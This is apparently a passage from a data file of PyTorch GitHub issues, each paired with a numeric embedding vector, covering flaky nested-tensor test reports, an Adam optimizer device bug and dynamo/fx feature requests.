This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_narrow_cpu_float32&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17867918159).

Over the past 3 hours, it has been determined flaky in 5 workflow(s) with 15 failures and 5 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_narrow_cpu_float32`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-0.3304155   0.04623759 -0.17457366 -0.08467352 -0.05970691 -0.40334293
 -0.00126443  0.15995085 -0.35086262 -0.19359846  0.31872094 -0.12771341
  0.24692973  0.09952664 -0.01804944 -0.11655972 -0.12341641 -0.11075484
  0.4186315   0.12914915 -0.21646976  0.01026452 -0.27277258  0.22292705
  0.19640422 -0.01338096 -0.17441808 -0.06529097  0.08924142  0.1061607
  0.22253086  0.11028461 -0.26575842 -0.02865555  0.5046753   0.19877289
 -0.0950857  -0.12137532 -0.32460386 -0.11514456  0.23461762  0.02712134
 -0.01447474 -0.13011593  0.21421143  0.01307179 -0.18257213  0.2317931
 -0.27655238 -0.04120451  0.09618478 -0.10999796  0.0128232  -0.35676908
  0.01978557 -0.1868197   0.11234374  0.32350856  0.10308479  0.21319753
  0.11091798 -0.00973062 -0.04689788 -0.07087302 -0.01560301  0.04559061
  0.2036564  -0.25586262  0.5180317  -0.08956103  0.1455123  -0.07979762
 -0.30084077  0.02472371  0.16970472  0.18382356 -0.27329296  0.07232185
 -0.04232869 -0.02140408 -0.11627082 -0.03806109  0.00408609  0.0489553
  0.17399323  0.0266393   0.1062972   0.00099127  0.18564436 -0.23975284
  0.17090094  0.24481946 -0.19713742  0.04014102 -0.13384688 -0.06886814
  0.33778533 -0.16090305 -0.40631685  0.19429117  0.16072735 -0.39986137
 -0.15206161  0.32249323 -0.15285441 -0.25607628  0.4711182   0.08301857
  0.08890547 -0.20911026  0.1427559   0.01173549 -0.00654417  0.03900062
  0.05679005 -0.08071961 -0.1497711  -0.119206   -0.05236764  0.5331212
 -0.25515166 -0.14771517  0.04652947 -0.07030517  0.3044477   0.03390091
 -0.142286    0.03058712  0.18861713  0.01716062  0.01755026  0.09981336
 -0.26911306 -0.08194978  0.11404951  0.10906446 -0.13394427 -0.21118566
  0.06592031  0.0546295  -0.15512548  0.10555878  0.07176235 -0.27510378
  0.24206786  0.07936737 -0.1304636   0.07955933 -0.11341331  0.00924627
  0.03502578  0.0608294   0.33861107  0.39543194 -0.01614536 -0.06229409
  0.4111443   0.16032621  0.09561153 -0.10676362 -0.08441284  0.4405679
 -0.09833676  0.0511386   0.28533563 -0.15019715 -0.49901187  0.00918942
  0.0093269   0.13738869 -0.10604338 -0.06700893  0.11124876 -0.10602538
 -0.05086739 -0.07088472  0.2569052  -0.3420344  -0.02431849  0.2114675
  0.0443662   0.03170367  0.199884    0.16606638 -0.04559764  0.13614315
  0.18437946 -0.09318735  0.09464456 -0.13578033 -0.49240065 -0.20889719
  0.04843093 -0.02056362 -0.21424286 -0.27578503  0.03303586 -0.10219413
 -0.02731634  0.04010291 -0.13858527  0.37057912  0.2689345  -0.06365332
  0.0620045   0.10291746 -0.19304119 -0.44048887  0.1336789   0.07705456
 -0.16228993 -0.05525875 -0.17088878 -0.34374368  0.01279939  0.00554369
 -0.07516229 -0.04072476 -0.04223661  0.23271205 -0.338659   -0.13173762
 -0.2690346  -0.13502683 -0.38028044 -0.05927907 -0.18657322  0.27267325
 -0.03376048  0.00587598 -0.05197374 -0.2287415   0.15888704  0.01378586
  0.32961124 -0.2721445  -0.33809876 -0.04404765  0.00076371  0.4667084
 -0.48432475 -0.5603719  -0.101687    0.09103356  0.03271336  0.04108669
  0.0260326  -0.10107102 -0.16570498  0.10658785 -0.1949774  -0.333557
  0.19400981  0.00342767  0.14214255  0.39745536 -0.07186456  0.06931687
  0.02845487 -0.03395228  0.03234507  0.3460183  -0.13684177  0.29954696
  0.16821809  0.10716309 -0.15911385  0.05142818  0.02275721 -0.20291157
  0.53042865 -0.50708884  0.04803282  0.1564861   0.27920055 -0.27651057
  0.3890184   0.21028943 -0.03892913 -0.139611    0.19036275  0.10266033
 -0.10556464 -0.16466263  0.1788595  -0.29503864 -0.16157652 -0.09564494
 -0.21906513 -0.09557462 -0.02941532  0.1818032   0.00212521  0.04972203
 -0.39920184 -0.013244    0.3300774  -0.25611895  0.12981549 -0.17751722
 -0.13122523 -0.09126095  0.08329538 -0.28961164  0.05028094 -0.0573492
  0.10477145 -0.01745805  0.44400764 -0.34049082  0.06898619  0.2466852
 -0.10009897  0.29476035 -0.00967542  0.04555125 -0.24200617  0.2946431
  0.02312084  0.2237066   0.30875778 -0.14524738 -0.37261236  0.10141979
  0.17177     0.03957814 -0.3403504  -0.0690651  -0.08974385  0.04573117
 -0.11570339 -0.14420585 -0.20073375 -0.20665058  0.03506241 -0.12191363
 -0.11358508  0.450459    0.031389   -0.18514144  0.08404489 -0.07035623
  0.04147447 -0.26057392 -0.10014513 -0.05270191  0.20090444  0.22310427
  0.24540274  0.08534887 -0.11179279  0.08625089 -0.19121829 -0.1450091
 -0.01200497  0.53659666  0.12861711  0.12295035  0.3474502   0.54340374
 -0.20029224 -0.03035798 -0.35473555 -0.27012712  0.23567186 -0.07531747
 -0.09533165 -0.01987141  0.0453492   0.28664142 -0.40156204  0.18612629
 -0.11848162  0.31556094  0.1424246  -0.06261468  0.21458071 -0.20920339
  0.00646383  0.00312524 -0.12845573  0.13864323  0.04265076  0.21477687]"
[fx] Detecting aliasing of `fx.Node` representing `Tensor` oncall: fx,"### ðŸš€ The feature, motivation and pitch

One possible method is to use the fake tensor to check for aliasing

```python
TensorVariable.proxy.node.meta[â€˜example_valueâ€™]
```

However, for some reason, this doesnâ€™t seem to work with `torch.vmap`:

```python
import torch

op = torch.Tensor.acos_

def fn(z):
  x = z.clone()
  result = torch.vmap(op)(x)
  assert(x is result)  # Fails in nopython=True when `is_` is implemented as testing equality of fake tensor
  
torch.compile(fn)(torch.zeros(10))

```

### Alternatives

NIL

### Additional context
Originally discovered: https://github.com/pytorch/pytorch/pull/111557#discussion_r1365886117

cc @ezyang @SherlockNoMad @EikanWang @jgong5 @wenzhe-nrv",False,"[-3.44305396e-01 -4.12526906e-01 -3.53126884e-01 -2.34306064e-02
  3.12493682e-01 -1.30009681e-01  4.02672112e-01 -2.14979835e-02
 -3.96606505e-01 -8.81330371e-02  1.13901466e-01 -1.09146535e-01
 -1.58984929e-01  2.34665517e-02 -6.25815243e-02  3.81424651e-02
 -2.12243259e-01 -2.00173613e-02  2.60352671e-01 -1.34628668e-01
  3.26435477e-01 -6.01903722e-02 -1.81270108e-01 -1.09295413e-01
 -5.85728586e-02  5.57873100e-02  2.01024696e-01 -1.05295315e-01
  4.05308127e-01 -4.70910519e-02  2.19377458e-01 -1.51145101e-01
 -5.11084080e-01  4.09544893e-02 -1.45835131e-01  1.58013597e-01
 -3.62323642e-01  6.50695264e-02 -2.09405050e-01 -1.15012929e-01
  1.55669868e-01  3.13425362e-02  1.87094241e-01 -6.35935366e-02
 -1.73291162e-01 -1.22401275e-01  2.86050647e-01  4.29318659e-02
 -5.46306595e-02 -2.55347073e-01  7.41040409e-02 -8.42533633e-02
 -3.92494291e-01 -2.69907564e-01  4.23586220e-02 -6.29423931e-02
  2.03480691e-01 -2.13137828e-03  1.25586808e-01 -2.80410171e-01
  2.36178413e-02  1.98698997e-01 -1.62058145e-01  8.42662975e-02
  4.53779995e-02  1.58447176e-01 -1.18918186e-02  9.78113338e-02
  4.53474641e-01  1.22425944e-01  7.16187209e-02 -1.62086412e-02
 -6.77097142e-02  7.85154551e-02  1.44779682e-04  2.78414607e-01
 -3.03417861e-01  3.04103673e-01  2.35531583e-01 -2.03864440e-01
  1.56965464e-01 -1.15583278e-01  1.37133047e-01  1.61302328e-01
  2.72977471e-01  2.39430815e-02  2.66689450e-01 -4.54414710e-02
  4.93922532e-01  3.04199040e-01  1.98971227e-01  7.23882541e-02
 -2.86565516e-02 -6.55304343e-02 -4.98285592e-02 -9.36240144e-03
  3.20866436e-01  2.47092202e-01  9.85702202e-02 -4.16459609e-03
 -1.85000092e-01 -3.87840927e-01 -4.49457526e-01  4.41106737e-01
  3.40625346e-01  1.57932982e-01 -4.93303500e-03 -8.42562467e-02
  1.28058791e-01 -1.37702078e-01  6.96833730e-02  9.06943083e-02
 -5.81217334e-02 -7.64225796e-02  9.22435075e-02 -4.44567502e-02
 -1.65702164e-01 -9.90818292e-02 -2.80086342e-02  1.19038656e-01
 -6.98893443e-02  8.98354650e-02  3.47865343e-01  4.95563447e-01
  4.16348994e-01  5.05301096e-02 -9.14047509e-02 -1.84756666e-02
 -5.99457286e-02  1.60492137e-01  2.74009794e-01 -8.24528858e-02
  1.01558715e-01  1.77364901e-01  2.72017121e-01 -1.07004076e-01
 -3.01536679e-01  1.73320875e-01 -3.15354109e-01  2.90732682e-01
 -2.42657781e-01 -3.32685485e-02 -2.88289249e-01  5.63135184e-03
  1.61280543e-01 -1.17529079e-01 -2.38692358e-01  1.24039888e-01
 -2.80872762e-01  7.36217052e-02  9.85889286e-02  4.77993228e-02
 -4.25903082e-01  1.68897688e-01  9.34693590e-03  2.87385762e-01
  1.08763464e-02 -2.91276947e-02  2.12256536e-01 -5.11648357e-01
  1.44691288e-01  4.08940315e-01 -1.08432606e-01 -1.12832099e-01
  3.50008368e-01  3.40739191e-02 -3.95259708e-01  6.86118826e-02
 -2.11096391e-01 -4.73151281e-02 -1.95984155e-01 -6.09182864e-02
 -2.65355647e-01  1.75790012e-01  9.64150876e-02  5.73092066e-02
  3.04399393e-02 -4.12220895e-01 -8.52464885e-02  3.74061495e-01
  3.64027798e-01  1.49265844e-02 -2.56651528e-02  1.97782502e-01
 -2.56961495e-01  1.62385345e-01  3.88484329e-01 -1.48113266e-01
 -1.08746521e-01 -7.10853934e-03 -5.39143570e-02  1.01348624e-01
 -1.47268781e-02  3.30001079e-02  2.39731014e-01 -1.33477032e-01
  2.40457118e-01 -9.38849673e-02 -4.72659506e-02 -3.11357528e-02
 -1.45516470e-01 -3.34088564e-01 -2.11298585e-01 -8.83047432e-02
  4.34222594e-02 -1.51217282e-01 -2.29852974e-01 -1.72847003e-01
 -5.45969725e-01  1.76278263e-01 -1.02319866e-01 -1.99358195e-01
 -6.09999150e-02 -1.29014671e-01 -6.43567890e-02 -2.23967969e-01
 -2.16523074e-02  9.66016576e-02 -2.76420116e-01  9.34037641e-02
  2.64687419e-01  6.97895885e-04 -2.59069689e-02 -1.80292904e-01
 -4.83068675e-02 -2.20580146e-01 -2.09029987e-02 -8.57211649e-02
 -2.05562204e-01  1.24781102e-01  1.77141130e-01 -1.08022518e-01
  3.09281558e-01 -9.22213197e-02  1.40546381e-01  1.64165385e-02
 -1.53962448e-01 -1.91493005e-01 -1.34657383e-01  1.35379180e-01
 -2.07410470e-01  1.80793330e-01 -1.67274594e-01 -2.92345770e-02
 -2.70011514e-01  2.46223256e-01 -1.57256946e-01  1.88086689e-01
 -3.15983206e-01  1.55453652e-01  2.77258009e-02  8.18408430e-02
 -3.13318074e-02  1.32318079e-01  1.46917254e-01  2.68126488e-01
 -5.60731366e-02  4.79635317e-04 -1.20186478e-01  2.02798039e-01
  7.58407041e-02  8.91687721e-02 -4.12327945e-02  3.65513206e-01
  8.16191062e-02  2.41207719e-01 -4.98425663e-01  3.86895776e-01
 -1.12941712e-01 -8.34484622e-02 -9.74455327e-02  7.50162080e-03
  2.28287876e-01 -2.27905288e-01  5.54617010e-02 -2.55726933e-01
  5.20557880e-01 -4.46315855e-02 -1.67502806e-01 -6.21977560e-02
  2.14360580e-02  3.28916371e-01 -1.22168869e-01  6.55589581e-01
  3.03433061e-01 -3.61349136e-01 -3.69511068e-01 -1.40094250e-01
 -2.46500954e-01 -2.37597674e-01 -4.09573853e-01 -1.78053662e-01
  4.55382526e-01  5.96352853e-02 -1.79507788e-02  1.11553289e-01
  1.34901479e-01  1.16547987e-01 -5.05745336e-02  9.02652666e-02
  2.38884419e-01  8.04800391e-02  1.78807348e-01 -1.74404651e-01
  8.52572024e-02 -2.52798080e-01  4.36328709e-01 -5.33142462e-02
  2.71430016e-01 -1.54523835e-01  1.88870758e-01  1.90536290e-01
  8.12157169e-02  1.47190049e-01 -5.30038662e-02  7.11837262e-02
 -1.54348284e-01  4.88307685e-01  2.07777068e-01  1.78628474e-01
 -6.99454919e-02 -2.92250633e-01 -3.57434936e-02 -1.39725819e-01
 -2.99240410e-01  1.16823338e-01 -5.86898960e-02 -3.74602169e-01
 -3.83635163e-01 -2.83904672e-01  7.56430849e-02 -2.39158809e-01
  5.28745055e-02  2.20567197e-01 -1.43798366e-01 -1.97091311e-01
 -2.23361090e-01  5.99014997e-01 -2.24665646e-02 -1.46111920e-01
 -2.39464268e-01 -1.11787312e-01 -1.91697389e-01 -2.84142077e-01
 -9.98187885e-02 -3.92013848e-01  2.24285886e-01  1.44708052e-01
  6.98444992e-02  9.38140750e-02 -2.25723535e-01  3.86925489e-02
 -1.68163627e-01  1.84870407e-01  1.40936881e-01  5.32022357e-01
  4.03699353e-02 -3.78407061e-01 -2.01647244e-02  4.18301761e-01
 -3.99263978e-01  4.01185155e-02 -3.33683968e-01 -4.06046242e-01
 -3.12536955e-02  1.78619996e-01  1.53469115e-01 -7.46239126e-02
  4.72754478e-01  2.30871946e-01  6.79098666e-02  7.62111694e-02
 -2.61720657e-01  1.07047483e-01  2.13246956e-01 -4.81691420e-01
 -7.49599338e-02  4.31375563e-01  2.19301388e-01 -1.41339600e-01
  4.80549037e-02  2.14133710e-01 -2.49749459e-02 -2.83581376e-01]"
Tensors in different devices module: optimizer triaged,"https://github.com/pytorch/pytorch/blob/4e310fd87521061ddc2f8e5ea93cc623563929cb/torch/optim/adam.py#L108-L108

torch+cu118-2.1.0, Ubuntu 22.04.2 LTS

When the device of params and grads is `cuda:0`, the device of `state_steps` is still `cpu`. This leads to an error:

```
Tensors of the same index must be on the same device and the same dtype except step tensors that can be CPU and float32 notwithstanding.
```

Unfortunately, I cannot provide a minimum replication, because this problem only occurs when I use [gcastle](https://github.com/huawei-noah/trustworthyAI/blob/master/gcastle/README.md) package. After debugging, I'm sure this problem is caused by the pytorch Adam optimizer.

```
from castle.algorithms import *
model = DAG_GNN(device_type='gpu', batch_size=3500, device_ids=0)
model.learn(x)
```

where `x` is any random numpy matrix, for example shape [2000, 13].

My suggestion is using `torch.tensor(0., device=p.device)` in `adam.py` Ln.108. Because in Ln.106 there is the same usage, I think it will not cause problem.

cc @vincentqb @jbschlosser @albanD @janeyx99 @crcrpar",False,"[-0.5384735  -0.324879   -0.323474    0.03443045 -0.01434611 -0.7051137
  0.16419032  0.01047291 -0.50443643 -0.14411649  0.32413065  0.31042635
 -0.2155489   0.04017115 -0.11859789  0.04113545 -0.01942647 -0.00909484
 -0.215114    0.09902247  0.09388506 -0.3901198  -0.4984743  -0.19717185
  0.12943406  0.25671634  0.05355214 -0.38158968  0.06015643  0.04735568
  0.45183736  0.1640088  -0.01080004 -0.0100585   0.01765605  0.31575242
 -0.13391657 -0.34927148 -0.12078826 -0.23042211 -0.12428391  0.17374167
  0.07356615  0.16416606 -0.19205576  0.1448839   0.00515483  0.30553377
  0.05305424 -0.22376603 -0.20317668 -0.15063106 -0.19475198 -0.39151153
  0.087068   -0.1471093  -0.01776992  0.17875834  0.07951257 -0.3666615
  0.2760176  -0.2256106  -0.01846594  0.06834047  0.16710459  0.16793442
  0.22320431 -0.39805436  0.40255135  0.06507846 -0.10367762  0.07538129
 -0.04079522 -0.00225864  0.24222054  0.14086343  0.09526601  0.3293993
  0.0405607   0.12931505  0.17344195 -0.29408544  0.10026942 -0.32651687
  0.3827505   0.00456275  0.05288709  0.3173625   0.10302164 -0.4730497
  0.28889403  0.13842753 -0.07598691 -0.19815528  0.16946603  0.22453034
  0.22295903 -0.02738224 -0.14540377 -0.16999301 -0.2549867  -0.22313374
 -0.34329355  0.4872719  -0.16313642 -0.16039738  0.09816328  0.00522978
  0.02489445  0.29113656  0.30568555  0.02144101 -0.06571165  0.20648316
  0.07396413  0.03055044 -0.46535492  0.13250498  0.20148002  0.33411705
 -0.3277278  -0.11633674  0.10649349  0.2112923   0.3862145   0.1527712
 -0.06396067  0.07759625 -0.26123345  0.34158581  0.19989756 -0.06490993
 -0.00086508  0.10575975 -0.22292311  0.13285232  0.10505151 -0.24587004
 -0.48610914 -0.2326582  -0.1303296   0.5341505   0.20142253 -0.38166785
  0.24054231 -0.01190703 -0.14688164 -0.10373941 -0.02297694  0.26165146
 -0.07800537 -0.08958645  0.07591602  0.5373111   0.37706786  0.3270038
  0.13592064 -0.12780398 -0.0519771  -0.47977698  0.15188687  0.26171613
 -0.27553657  0.22642964 -0.08395734  0.06014202 -0.44579577 -0.17353977
 -0.14031535  0.37501314 -0.18002385  0.07885033  0.05031788 -0.11982879
  0.24864061 -0.08876844  0.03536953 -0.49017876 -0.15094166  0.09087946
  0.10617701  0.03143395  0.4937858  -0.05108085  0.11380053  0.28482497
  0.31793773  0.20726806 -0.42829216 -0.3407367  -0.29480246 -0.09707485
  0.08214974 -0.12501384 -0.06660734 -0.06924795  0.05174743  0.25318146
 -0.2001864   0.07903972 -0.218721    0.04824246 -0.08803608  0.11217669
  0.19311154 -0.2213092  -0.34166303 -0.24262615 -0.2901245   0.37488672
  0.12600459 -0.32634878 -0.13647893 -0.09360322 -0.33575654  0.16641957
 -0.18377829  0.172188   -0.25247037  0.27741268  0.15651777 -0.22094461
 -0.1156184  -0.3394928  -0.2611613  -0.18535149 -0.05624212 -0.03027212
 -0.18097958  0.12891941  0.01558591 -0.22091854  0.1980952  -0.04515497
 -0.00367837 -0.16793334 -0.04906093 -0.16337632  0.16988051  0.42639017
 -0.5458935  -0.10413949  0.1637637  -0.11255211 -0.00157919  0.47254074
  0.15205806 -0.10142044 -0.26009703  0.07305875  0.24270013 -0.28240335
  0.08984716  0.15280809  0.1139757  -0.22977549  0.16270606  0.11287011
  0.09406185 -0.00117316  0.27098918  0.08659986 -0.11239684  0.3733927
  0.39009407  0.58003914 -0.34565547  0.40397382 -0.10720502 -0.27536976
  0.11213835 -0.12569946  0.09228595 -0.42565322  0.06445779 -0.34981847
  0.26746356 -0.10109015 -0.10356029  0.03255989  0.06960421 -0.0504629
 -0.24416815  0.20925021  0.15602493 -0.6657849  -0.11300156 -0.38620752
 -0.06678225  0.06398426 -0.18110228  0.49581808  0.3332213   0.09413478
  0.04971233  0.0733448   0.1302628   0.05876537 -0.07400578 -0.04346506
 -0.14919016  0.20130426  0.07634432 -0.3157835  -0.21634743 -0.05271349
 -0.01568786  0.17540383  0.37570477 -0.0628157   0.19628575  0.08893087
  0.13066679  0.15574943 -0.12625176  0.08308842 -0.03870285  0.85442364
  0.36137718  0.22368371  0.05834918 -0.21764097 -0.16513312 -0.11347926
  0.06202284  0.0943057  -0.37039116 -0.15512827 -0.10025369 -0.02626581
 -0.02212365 -0.21560065 -0.0328435   0.4532585   0.04865114  0.2680912
 -0.25693917  0.17472959  0.02928959 -0.29247925 -0.13543668 -0.02048644
  0.1473985  -0.21311782 -0.02317582 -0.28727874  0.3744931   0.28509384
  0.00439182 -0.0852079  -0.51519525  0.17948681  0.02070664  0.00914732
 -0.01614498  0.2918743   0.16120943  0.11252867  0.41123587  0.31683844
 -0.14874744  0.09020436 -0.37965286  0.1809799   0.08913352 -0.22637798
  0.21978164 -0.31475568 -0.35286772  0.652679   -0.13968791  0.40593684
 -0.0583536  -0.02309719  0.3800648  -0.5262282  -0.394974    0.34126922
 -0.2984374   0.20346355  0.2521512   0.05915657 -0.10906695  0.27563664]"
DISABLED test_narrow_cpu_float16 (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_narrow_cpu_float16&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17849375503).

Over the past 3 hours, it has been determined flaky in 2 workflow(s) with 6 failures and 2 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_narrow_cpu_float16`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-0.32794094  0.08412249 -0.16976127 -0.11724027 -0.0913434  -0.39035118
  0.00582454  0.14872354 -0.31007862 -0.25997937  0.37072414 -0.1203895
  0.26141495  0.07591486 -0.05517326 -0.08807021 -0.13464476 -0.09778804
  0.44384924  0.07535915 -0.25443175 -0.01153693 -0.2920739   0.2372493
  0.17920488 -0.01489328 -0.17774525 -0.08205781  0.12648818  0.10581612
  0.26136604  0.17162514 -0.29117844 -0.03838076  0.585119    0.17391293
 -0.12732278 -0.12148823 -0.30078006 -0.12051506  0.23720942  0.02715611
 -0.01379886 -0.15627602  0.22013733  0.00559557 -0.20461589  0.23558357
 -0.26534227 -0.06324256  0.12292579 -0.0734373   0.02463388 -0.32038662
 -0.00326995 -0.17853151  0.0766743   0.3123759   0.13385807  0.21049163
  0.08750144 -0.02837014 -0.11538872 -0.07511482  0.00468113  0.00700179
  0.24403581 -0.22999741  0.4816482  -0.06208732  0.14467168 -0.09850178
 -0.32399502 -0.02084848  0.15467873  0.15807003 -0.27012008  0.06730253
 -0.02550116 -0.02344445 -0.13431296 -0.0236968   0.02503394  0.0310403
  0.19664142  0.03498917  0.1382572  -0.01960442  0.1460509  -0.24157839
  0.1647228   0.2682491  -0.20649335  0.11051086 -0.08002703 -0.12570609
  0.35146064 -0.2030722  -0.40004995  0.20635836  0.1553922  -0.33251476
 -0.13317601  0.32870695 -0.20420922 -0.24300815  0.454855    0.08639078
  0.10889334 -0.14109659  0.13765875  0.02493429 -0.01274144  0.0509679
  0.02367684 -0.14439562 -0.16364631 -0.11483992 -0.03916343  0.5133855
 -0.2661422  -0.14301464 -0.01075    -0.04311807  0.2767138   0.04940461
 -0.1396781   0.05725023  0.2157368   0.00906166  0.00355555  0.08136635
 -0.252732   -0.05517463  0.1479316   0.11955065 -0.15616377 -0.20177306
  0.02576009  0.0316941  -0.18093088  0.07250682  0.0862152  -0.3040969
  0.27072555  0.04966097 -0.13571183  0.10405283 -0.11416635 -0.00259659
  0.09233636 -0.00669256  0.3436755   0.4233923  -0.04256858 -0.09650593
  0.4046579   0.15360674  0.10409547 -0.11259602 -0.07795039  0.45924196
 -0.06697755  0.01874349  0.3045105  -0.17679346 -0.4616369  -0.0194793
 -0.00237809  0.1389367  -0.10590813 -0.06569905  0.08865152 -0.06457569
  0.01216841 -0.06130113  0.24415547 -0.32647416 -0.08680676  0.2341448
  0.0008623  -0.03040028  0.20370468  0.08752822 -0.032895    0.15110047
  0.16358742 -0.11374183  0.03226527 -0.13187377 -0.49697232 -0.19733182
  0.07525574 -0.01882203 -0.22104305 -0.2827183   0.00683094 -0.10634507
  0.00984477  0.03463691 -0.18499498  0.41641283  0.31095952 -0.07514718
  0.07610385  0.07562406 -0.1864532  -0.3948812   0.16514263  0.07124399
 -0.1692179  -0.07039592 -0.18223348 -0.3520332   0.01362511  0.0026164
 -0.04749222 -0.02570664 -0.0652833   0.17511463 -0.31886864 -0.10581961
 -0.27730083 -0.12244277 -0.3709846  -0.03376611 -0.16923818  0.29809588
 -0.04188583 -0.01889863 -0.05155136 -0.19798508  0.19708583  0.02535594
  0.31574255 -0.26598608 -0.3675235  -0.04867945  0.03773274  0.49862146
 -0.4603597  -0.53574705 -0.11281106  0.05234414  0.03101042  0.06116831
 -0.0092256  -0.08329308 -0.12587062  0.09499957 -0.11192293 -0.35256994
  0.1608563   0.00825457  0.13737673  0.37078428 -0.01141158  0.1090724
  0.01964005 -0.0714642   0.03650692  0.31704935 -0.16240723  0.28943098
  0.19951826  0.1255352  -0.12392099  0.05940009  0.0244832  -0.21833518
  0.5199619  -0.4741553   0.0499865   0.17399183  0.30765253 -0.2614768
  0.41660982  0.25447553 -0.01996339 -0.17270277  0.17267957  0.10332242
 -0.13760456 -0.19402137  0.15607163 -0.35283482 -0.15450937 -0.09496963
 -0.19843252 -0.13019092 -0.05072987  0.15848514  0.00156879  0.08680049
 -0.4163072  -0.01257322  0.3314708  -0.23436049  0.09331705 -0.20189252
 -0.16110158 -0.08745537  0.07264739 -0.29875535  0.06665271 -0.05841869
  0.10372891  0.00285581  0.4597692  -0.31252587  0.08699469  0.22384368
 -0.1134732   0.2610867   0.02477987  0.03644888 -0.21968183  0.29733723
  0.00452085  0.1997008   0.33885032 -0.12545371 -0.34286714  0.1205084
  0.18056351  0.04538606 -0.36417574 -0.05171436 -0.08671716  0.05148559
 -0.08313397 -0.15031558 -0.1682424  -0.25352907  0.06909239 -0.14785387
 -0.12189938  0.42163795  0.03179809 -0.18462224  0.08191448 -0.03424394
  0.06693497 -0.21856308 -0.12172006 -0.05760549  0.23493387  0.2412577
  0.20643881  0.03603482 -0.07107513  0.06870888 -0.17259175 -0.11245641
 -0.05311257  0.5287621   0.12897508  0.10734252  0.3494072   0.5918082
 -0.22794065 -0.04222596 -0.34566733 -0.2817546   0.19962905 -0.05106561
 -0.09095387 -0.05173555  0.03389313  0.32612848 -0.38706356  0.21118075
 -0.09660143  0.3104374   0.14309941 -0.08081846  0.20772937 -0.19830468
 -0.01675451 -0.00447138 -0.09808023  0.13479827  0.0403651   0.19075489]"
[dynamo] Implement `set.__contains__` for tensors based on object identity oncall: pt2,"### ðŸš€ The feature, motivation and pitch

Workaround to https://github.com/pytorch/pytorch/issues/111544 for `set.__contains__` case

### Alternatives

_No response_

### Additional context

Related https://github.com/pytorch/pytorch/issues/111550

cc @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-3.80627036e-01 -1.52631193e-01 -2.86741972e-01  1.52924553e-01
  8.97502005e-02 -2.56287634e-01  4.11320359e-01 -2.63432920e-01
 -4.58815962e-01 -2.72640586e-02  2.65638351e-01 -1.16663381e-01
  9.29378942e-02 -8.74586254e-02  2.81974882e-01  2.63805926e-01
 -2.28849854e-02  2.03024939e-01 -1.63521588e-01 -1.17832035e-01
  2.95497421e-02 -1.65354721e-02 -3.04345220e-01  2.31089205e-01
 -8.20274279e-02  2.60848999e-01 -1.26994088e-01 -1.14910021e-01
 -5.88522330e-02  1.24944411e-02  4.78330910e-01  1.89999118e-01
 -4.66829240e-02 -8.77109244e-02 -3.55329365e-02  3.56476396e-01
 -5.63008189e-02 -3.52871493e-02 -6.68767989e-02 -6.54697418e-02
 -1.34631125e-02  7.12315217e-02  2.33212292e-01 -1.89699858e-01
 -8.38728324e-02 -1.46796644e-01  2.29708143e-02 -2.96866409e-02
 -1.59450039e-01 -2.23441333e-01 -1.97072804e-01 -6.44160509e-02
 -4.05488789e-01 -3.58739972e-01 -4.74063680e-02  1.52764603e-01
  1.17048942e-01  3.42143595e-01 -6.47248477e-02 -7.87167698e-02
  1.60881609e-01 -2.18561366e-01 -2.40448005e-02  2.06971645e-01
 -2.22738922e-01 -7.06384927e-02  1.29776359e-01  7.69284368e-02
  6.90402150e-01 -7.29790181e-02  3.88326764e-01  1.63222790e-01
 -1.36674091e-01 -5.45001402e-02  2.47620225e-01  2.94937015e-01
 -8.02525431e-02  1.41159877e-01  1.08129397e-01 -1.61999688e-01
 -2.23502666e-01  1.03820488e-01  1.42699584e-01 -8.15073326e-02
  1.37053877e-01  2.59334873e-03  1.00315407e-01  1.42609030e-01
  3.20331931e-01 -5.90235069e-02  4.11956668e-01 -3.32877755e-01
  8.22846591e-02 -2.74022102e-01  3.08223546e-01  2.91386515e-01
  1.13524318e-01  3.26155648e-02  5.87055646e-02 -9.10407156e-02
 -2.78317988e-01 -6.03730798e-01 -3.72384250e-01  5.14202658e-03
  3.60804871e-02 -5.65028824e-02 -3.88034470e-02  6.51193112e-02
  5.41418269e-02 -1.79597110e-01  2.52635449e-01 -5.82751781e-02
 -1.57804891e-01  1.26911819e-01 -8.20932537e-02 -1.87597014e-02
 -9.18768644e-02 -2.90273368e-01 -7.42640197e-02  3.19591880e-01
  2.63073504e-01 -2.28952289e-01  5.11383712e-02  3.94677013e-01
  2.24312171e-01  2.10632414e-01 -1.12759121e-01 -1.39396012e-01
 -7.99618289e-03  1.05546832e-01  1.06226996e-01 -8.03430825e-02
  6.22296780e-02  3.12537789e-01  1.48226870e-02 -1.33592680e-01
 -2.11321995e-01  1.30546331e-01 -2.02084661e-01  3.57801348e-01
 -1.41553864e-01  4.72633913e-02 -5.89254685e-02 -5.91328263e-01
  2.12345868e-01  1.12481728e-01 -7.47561157e-02 -6.21382669e-02
  5.72628751e-02  2.65805274e-02 -2.39851758e-01  1.74588412e-01
 -4.36416864e-02  4.24512506e-01  1.78824723e-01  1.44047737e-01
  9.40485820e-02 -5.12602925e-02  5.54336123e-02 -4.13123250e-01
